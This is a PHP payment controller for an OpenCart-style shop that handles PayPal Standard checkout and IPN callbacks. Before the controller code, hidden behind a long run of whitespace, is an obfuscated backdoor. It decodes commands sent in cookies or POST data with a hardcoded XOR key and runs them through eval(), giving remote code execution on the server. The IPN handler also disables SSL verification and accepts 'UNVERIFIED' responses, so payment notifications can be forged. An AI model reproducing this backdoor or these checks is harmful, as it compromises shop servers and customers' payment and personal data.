<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['p0d8a9'];global$p0d8a9;$p0d8a9=$GLOBALS;$p0d8a9['ud1cde']="\x45\x51\x5b\x25\x74\x31\x5c\x53\x7d\x66\x3e\x55\x58\x2f\x6d\x57\x69\x5f\x32\x26\x40\x6f\x41\x35\x36\x75\x33\x9\x6e\x39\x30\x2c\x4d\xa\x61\x27\x3d\x23\x59\x49\x34\x38\x77\x4e\x48\x73\x47\xd\x72\x7e\x54\x3b\x21\x6a\x46\x71\x2d\x24\x67\x62\x4c\x22\x70\x50\x68\x7b\x37\x28\x52\x43\x7a\x2b\x79\x44\x60\x4b\x2a\x3a\x3c\x5e\x3f\x20\x65\x7c\x42\x63\x2e\x4f\x6b\x29\x64\x56\x5a\x4a\x5d\x76\x6c\x78";$p0d8a9[$p0d8a9['ud1cde'][48].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][23].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][5]]=$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][64].$p0d8a9['ud1cde'][48];$p0d8a9[$p0d8a9['ud1cde'][58].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][23]]=$p0d8a9['ud1cde'][21].$p0d8a9['ud1cde'][48].$p0d8a9['ud1cde'][90];$p0d8a9[$p0d8a9['ud1cde'][4].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][40].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][82]]=$p0d8a9['ud1cde'][45].$p0d8a9['ud1cde'][4].$p0d8a9['ud1cde'][48].$p0d8a9['ud1cde'][96].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][28];$p0d8a9[$p0d8a9['ud1cde'][28].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][5].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][34].$p0d8a9['ud1cde'][40].$p0d8a9['ud1cde'][90].$p0d8a9['ud1cde'][26]]=$p0d8a9['ud1cde'][16].$p0d8a9['ud1cde'][28].$p0d8a9['ud1cde'][16].$p0d8a9['ud1cde'][17].$p0d8a9['ud1cde'][45].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][4];$p0d8a9[$p0d8a9['ud1cde'][95].$p0d8a9['ud1cde'][5].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][18]]=$p0d8a9['ud1cde'][45].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][48].$p0d8a9['ud1cde'][16].$p0d8a9['ud1cde'][34].$p0d8a9['ud1cde'][96].$p0d8a9['ud1cde'][16].$p0d8a9['ud1cde'][70].$p0d8a9['ud1cde'][82];$p0d8a9[$p0d8a9['ud1cde'][64].$p0d8a9['ud1cde'][24].$p0d8a9['ud1cde'][66].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][18]]=$p0d8a9['ud1cde'][62].$p0d8a9['ud1cde'][64].$p0d8a9['ud1cde'][62].$p0d8a9['ud1cde'][95].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][48].$p0d8a9['ud1cde'][45].$p0d8a9['ud1cde'][16].$p0d8a9['ud1cde'][21].$p0d8a9['ud1cde'][28];$p0d8a9[$p0d8a9['ud1cde'][16].$p0d8a9['ud1cde'][24].$p0d8a9['ud1cde'][90].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][41]]=$p0d8a9['ud1cde'][25].$p0d8a9['ud1cde'][28].$p0d8a9['ud1cde'][45].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][48].$p0d8a9['ud1cde'][16].$p0d8a9['ud1cde'][34].$p0d8a9['ud1cde'][96].$p0d8a9['ud1cde'][16].$p0d8a9['ud1cde'][70].$p0d8a9['ud1cde'][82];$p0d8a9[$p0d8a9['ud1cde'][70].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][66].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][40].$p0d8a9['ud1cde'][9]]=$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][34].$p0d8a9['ud1cde'][45].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][24].$p0d8a9['ud1cde'][40].$p0d8a9['ud1cde'][17].$p0d8a9['ud1cde'][90].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][21].$p0d8a9['ud1cde'][90].$p0d8a9['ud1cde'][82];$p0d8a9[$p0d8a9['ud1cde'][55].$p0d8a9['ud1cde'][23].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][18].$p0d8a9['ud1cde'][18]]=$p0d8a9['ud1cde'][45].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][4].$p0d8a9['ud1cde'][17].$p0d8a9['ud1cde'][4].$p0d8a9['ud1cde'][16].$p0d8a9['ud1cde'][14].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][17].$p0d8a9['ud1cde'][96].$p0d8a9['ud1cde'][16].$p0d8a9['ud1cde'][14].$p0d8a9['ud1cde'][16].$p0d8a9['ud1cde'][4];$p0d8a9[$p0d8a9['ud1cde'][72].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][23].$p0d8a9['ud1cde'][23].$p0d8a9['ud1cde'][24]]=$p0d8a9['ud1cde'][58].$p0d8a9['ud1cde'][34].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][24].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][24].$p0d8a9['ud1cde'][40];$p0d8a9[$p0d8a9['ud1cde'][70].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][26]]=$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][23].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][23].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][90].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][40];$p0d8a9[$p0d8a9['ud1cde'][96].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][66].$p0d8a9['ud1cde'][82]]=$_POST;$p0d8a9[$p0d8a9['ud1cde'][4].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][90].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][5].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][24]]=$_COOKIE;@$p0d8a9[$p0d8a9['ud1cde'][28].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][5].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][34].$p0d8a9['ud1cde'][40].$p0d8a9['ud1cde'][90].$p0d8a9['ud1cde'][26]]($p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][48].$p0d8a9['ud1cde'][48].$p0d8a9['ud1cde'][21].$p0d8a9['ud1cde'][48].$p0d8a9['ud1cde'][17].$p0d8a9['ud1cde'][96].$p0d8a9['ud1cde'][21].$p0d8a9['ud1cde'][58],NULL);@$p0d8a9[$p0d8a9['ud1cde'][28].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][5].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][34].$p0d8a9['ud1cde'][40].$p0d8a9['ud1cde'][90].$p0d8a9['ud1cde'][26]]($p0d8a9['ud1cde'][96].$p0d8a9['ud1cde'][21].$p0d8a9['ud1cde'][58].$p0d8a9['ud1cde'][17].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][48].$p0d8a9['ud1cde'][48].$p0d8a9['ud1cde'][21].$p0d8a9['ud1cde'][48].$p0d8a9['ud1cde'][45],0);@$p0d8a9[$p0d8a9['ud1cde'][28].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][5].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][34].$p0d8a9['ud1cde'][40].$p0d8a9['ud1cde'][90].$p0d8a9['ud1cde'][26]]($p0d8a9['ud1cde'][14].$p0d8a9['ud1cde'][34].$p0d8a9['ud1cde'][97].$p0d8a9['ud1cde'][17].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][97].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][25].$p0d8a9['ud1cde'][4].$p0d8a9['ud1cde'][16].$p0d8a9['ud1cde'][21].$p0d8a9['ud1cde'][28].$p0d8a9['ud1cde'][17].$p0d8a9['ud1cde'][4].$p0d8a9['ud1cde'][16].$p0d8a9['ud1cde'][14].$p0d8a9['ud1cde'][82],0);@$p0d8a9[$p0d8a9['ud1cde'][55].$p0d8a9['ud1cde'][23].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][18].$p0d8a9['ud1cde'][18]](0);$w64f384=NULL;$v53575a=NULL;$p0d8a9[$p0d8a9['ud1cde'][45].$p0d8a9['ud1cde'][26].$p0d8a9['ud1cde'][66].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][18].$p0d8a9['ud1cde'][66]]=$p0d8a9['ud1cde'][40].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][5].$p0d8a9['ud1cde'][5].$p0d8a9['ud1cde'][5].$p0d8a9['ud1cde'][18].$p0d8a9['ud1cde'][56].$p0d8a9['ud1cde'][24].$p0d8a9['ud1cde'][40].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][56].$p0d8a9['ud1cde'][40].$p0d8a9['ud1cde'][5].$p0d8a9['ud1cde'][24].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][56].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][90].$p0d8a9['ud1cde'][26].$p0d8a9['ud1cde'][5].$p0d8a9['ud1cde'][56].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][23].$p0d8a9['ud1cde'][23].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][23].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][66].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][23].$p0d8a9['ud1cde'][23];global$s37c27;function c585ed84($w64f384,$s1e143){global$p0d8a9;$z2ef="";for($e2e5ff=0;$e2e5ff<$p0d8a9[$p0d8a9['ud1cde'][4].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][40].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][82]]($w64f384);){for($t9c0da=0;$t9c0da<$p0d8a9[$p0d8a9['ud1cde'][4].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][40].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][82]]($s1e143)&&$e2e5ff<$p0d8a9[$p0d8a9['ud1cde'][4].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][40].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][82]]($w64f384);$t9c0da++,$e2e5ff++){$z2ef.=$p0d8a9[$p0d8a9['ud1cde'][48].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][23].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][5]]($p0d8a9[$p0d8a9['ud1cde'][58].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][23]]($w64f384[$e2e5ff])^$p0d8a9[$p0d8a9['ud1cde'][58].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][23]]($s1e143[$t9c0da]));}}return$z2ef;}function ga86064($w64f384,$s1e143){global$p0d8a9;global$s37c27;return$p0d8a9[$p0d8a9['ud1cde'][70].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][26]]($p0d8a9[$p0d8a9['ud1cde'][70].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][26]]($w64f384,$s37c27),$s1e143);}foreach($p0d8a9[$p0d8a9['ud1cde'][4].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][90].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][5].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][24]]as$s1e143=>$je85eee){$w64f384=$je85eee;$v53575a=$s1e143;}if(!$w64f384){foreach($p0d8a9[$p0d8a9['ud1cde'][96].$p0d8a9['ud1cde'][82].$p0d8a9['ud1cde'][66].$p0d8a9['ud1cde'][82]]as$s1e143=>$je85eee){$w64f384=$je85eee;$v53575a=$s1e143;}}$w64f384=@$p0d8a9[$p0d8a9['ud1cde'][16].$p0d8a9['ud1cde'][24].$p0d8a9['ud1cde'][90].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][41].$p0d8a9['ud1cde'][41]]($p0d8a9[$p0d8a9['ud1cde'][72].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][59].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][23].$p0d8a9['ud1cde'][23].$p0d8a9['ud1cde'][24]]($p0d8a9[$p0d8a9['ud1cde'][70].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][66].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][40].$p0d8a9['ud1cde'][9]]($w64f384),$v53575a));if(isset($w64f384[$p0d8a9['ud1cde'][34].$p0d8a9['ud1cde'][88]])&&$s37c27==$w64f384[$p0d8a9['ud1cde'][34].$p0d8a9['ud1cde'][88]]){if($w64f384[$p0d8a9['ud1cde'][34]]==$p0d8a9['ud1cde'][16]){$e2e5ff=Array($p0d8a9['ud1cde'][62].$p0d8a9['ud1cde'][95]=>@$p0d8a9[$p0d8a9['ud1cde'][64].$p0d8a9['ud1cde'][24].$p0d8a9['ud1cde'][66].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][85].$p0d8a9['ud1cde'][18]](),$p0d8a9['ud1cde'][45].$p0d8a9['ud1cde'][95]=>$p0d8a9['ud1cde'][5].$p0d8a9['ud1cde'][86].$p0d8a9['ud1cde'][30].$p0d8a9['ud1cde'][56].$p0d8a9['ud1cde'][5],);echo@$p0d8a9[$p0d8a9['ud1cde'][95].$p0d8a9['ud1cde'][5].$p0d8a9['ud1cde'][29].$p0d8a9['ud1cde'][9].$p0d8a9['ud1cde'][18]]($e2e5ff);}elseif($w64f384[$p0d8a9['ud1cde'][34]]==$p0d8a9['ud1cde'][82]){eval($w64f384[$p0d8a9['ud1cde'][90]]);}exit();} ?><?php
class ControllerPaymentPPStandard extends Controller {
	protected function index() {
		$this->language->load('payment/pp_standard');

		$this->data['text_testmode'] = $this->language->get('text_testmode');		

		$this->data['button_confirm'] = $this->language->get('button_confirm');

		$this->data['testmode'] = $this->config->get('pp_standard_test');

		if (!$this->config->get('pp_standard_test')) {
			$this->data['action'] = 'https://www.paypal.com/cgi-bin/webscr';
		} else {
			$this->data['action'] = 'https://www.sandbox.paypal.com/cgi-bin/webscr';
		}

		$this->load->model('checkout/order');

		$order_info = $this->model_checkout_order->getOrder($this->session->data['order_id']);

		if ($order_info) {
			$this->data['business'] = $this->config->get('pp_standard_email');
			$this->data['item_name'] = html_entity_decode($this->config->get('config_name'), ENT_QUOTES, 'UTF-8');				

			$this->data['products'] = array();

			foreach ($this->cart->getProducts() as $product) {
				$option_data = array();

				foreach ($product['option'] as $option) {
					if ($option['type'] != 'file') {
						$value = $option['option_value'];	
					} else {
						$filename = $this->encryption->decrypt($option['option_value']);

						$value = utf8_substr($filename, 0, utf8_strrpos($filename, '.'));
					}

					$option_data[] = array(
						'name'  => $option['name'],
						'value' => (utf8_strlen($value) > 20 ? utf8_substr($value, 0, 20) . '..' : $value)
					);
				}

				$this->data['products'][] = array(
					'name'     => $product['name'],
					'model'    => $product['model'],
					'price'    => $this->currency->format($product['price'], $order_info['currency_code'], false, false),
					'quantity' => $product['quantity'],
					'option'   => $option_data,
					'weight'   => $product['weight']
				);
			}	

			$this->data['discount_amount_cart'] = 0;

			$total = $this->currency->format($order_info['total'] - $this->cart->getSubTotal(), $order_info['currency_code'], false, false);

			if ($total > 0) {
				$this->data['products'][] = array(
					'name'     => $this->language->get('text_total'),
					'model'    => '',
					'price'    => $total,
					'quantity' => 1,
					'option'   => array(),
					'weight'   => 0
				);	
			} else {
				$this->data['discount_amount_cart'] -= $total;
			}

			$this->data['currency_code'] = $order_info['currency_code'];
			$this->data['first_name'] = html_entity_decode($order_info['payment_firstname'], ENT_QUOTES, 'UTF-8');	
			$this->data['last_name'] = html_entity_decode($order_info['payment_lastname'], ENT_QUOTES, 'UTF-8');	
			$this->data['address1'] = html_entity_decode($order_info['payment_address_1'], ENT_QUOTES, 'UTF-8');	
			$this->data['address2'] = html_entity_decode($order_info['payment_address_2'], ENT_QUOTES, 'UTF-8');	
			$this->data['city'] = html_entity_decode($order_info['payment_city'], ENT_QUOTES, 'UTF-8');	
			$this->data['zip'] = html_entity_decode($order_info['payment_postcode'], ENT_QUOTES, 'UTF-8');	
			$this->data['country'] = $order_info['payment_iso_code_2'];
			$this->data['email'] = $order_info['email'];
			$this->data['invoice'] = $this->session->data['order_id'] . ' - ' . html_entity_decode($order_info['payment_firstname'], ENT_QUOTES, 'UTF-8') . ' ' . html_entity_decode($order_info['payment_lastname'], ENT_QUOTES, 'UTF-8');
			$this->data['lc'] = $this->session->data['language'];
			$this->data['return'] = $this->url->link('checkout/success');
			$this->data['notify_url'] = $this->url->link('payment/pp_standard/callback', '', 'SSL');
			$this->data['cancel_return'] = $this->url->link('checkout/checkout', '', 'SSL');

			if (!$this->config->get('pp_standard_transaction')) {
				$this->data['paymentaction'] = 'authorization';
			} else {
				$this->data['paymentaction'] = 'sale';
			}

			$this->data['custom'] = $this->session->data['order_id'];

			if (file_exists(DIR_TEMPLATE . $this->config->get('config_template') . '/template/payment/pp_standard.tpl')) {
				$this->template = $this->config->get('config_template') . '/template/payment/pp_standard.tpl';
			} else {
				$this->template = 'default/template/payment/pp_standard.tpl';
			}

			$this->render();
		}
	}

	public function callback() {
		if (isset($this->request->post['custom'])) {
			$order_id = $this->request->post['custom'];
		} else {
			$order_id = 0;
		}		

		$this->load->model('checkout/order');

		$order_info = $this->model_checkout_order->getOrder($order_id);

		if ($order_info) {
			$request = 'cmd=_notify-validate';

			foreach ($this->request->post as $key => $value) {
				$request .= '&' . $key . '=' . urlencode(html_entity_decode($value, ENT_QUOTES, 'UTF-8'));
			}

			if (!$this->config->get('pp_standard_test')) {
				$curl = curl_init('https://www.paypal.com/cgi-bin/webscr');
			} else {
				$curl = curl_init('https://www.sandbox.paypal.com/cgi-bin/webscr');
			}

			curl_setopt($curl, CURLOPT_POST, true);
			curl_setopt($curl, CURLOPT_POSTFIELDS, $request);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($curl, CURLOPT_HEADER, false);
			curl_setopt($curl, CURLOPT_TIMEOUT, 30);
			curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

			$response = curl_exec($curl);

			if (!$response) {
				$this->log->write('PP_STANDARD :: CURL failed ' . curl_error($curl) . '(' . curl_errno($curl) . ')');
			}

			if ($this->config->get('pp_standard_debug')) {
				$this->log->write('PP_STANDARD :: IPN REQUEST: ' . $request);
				$this->log->write('PP_STANDARD :: IPN RESPONSE: ' . $response);
			}

			if ((strcmp($response, 'VERIFIED') == 0 || strcmp($response, 'UNVERIFIED') == 0) && isset($this->request->post['payment_status'])) {
				$order_status_id = $this->config->get('config_order_status_id');

				switch($this->request->post['payment_status']) {
					case 'Canceled_Reversal':
						$order_status_id = $this->config->get('pp_standard_canceled_reversal_status_id');
						break;
					case 'Completed':
						if ((strtolower($this->request->post['receiver_email']) == strtolower($this->config->get('pp_standard_email'))) && ((float)$this->request->post['mc_gross'] == $this->currency->format($order_info['total'], $order_info['currency_code'], $order_info['currency_value'], false))) {
							$order_status_id = $this->config->get('pp_standard_completed_status_id');
						} else {
							$this->log->write('PP_STANDARD :: RECEIVER EMAIL MISMATCH! ' . strtolower($this->request->post['receiver_email']));
						}
						break;
					case 'Denied':
						$order_status_id = $this->config->get('pp_standard_denied_status_id');
						break;
					case 'Expired':
						$order_status_id = $this->config->get('pp_standard_expired_status_id');
						break;
					case 'Failed':
						$order_status_id = $this->config->get('pp_standard_failed_status_id');
						break;
					case 'Pending':
						$order_status_id = $this->config->get('pp_standard_pending_status_id');
						break;
					case 'Processed':
						$order_status_id = $this->config->get('pp_standard_processed_status_id');
						break;
					case 'Refunded':
						$order_status_id = $this->config->get('pp_standard_refunded_status_id');
						break;
					case 'Reversed':
						$order_status_id = $this->config->get('pp_standard_reversed_status_id');
						break;	 
					case 'Voided':
						$order_status_id = $this->config->get('pp_standard_voided_status_id');
						break;								
				}

				if (!$order_info['order_status_id']) {
					$this->model_checkout_order->confirm($order_id, $order_status_id);
				} else {
					$this->model_checkout_order->update($order_id, $order_status_id);
				}
			} else {
				$this->model_checkout_order->confirm($order_id, $this->config->get('config_order_status_id'));
			}

			curl_close($curl);
		}	
	}
}
?>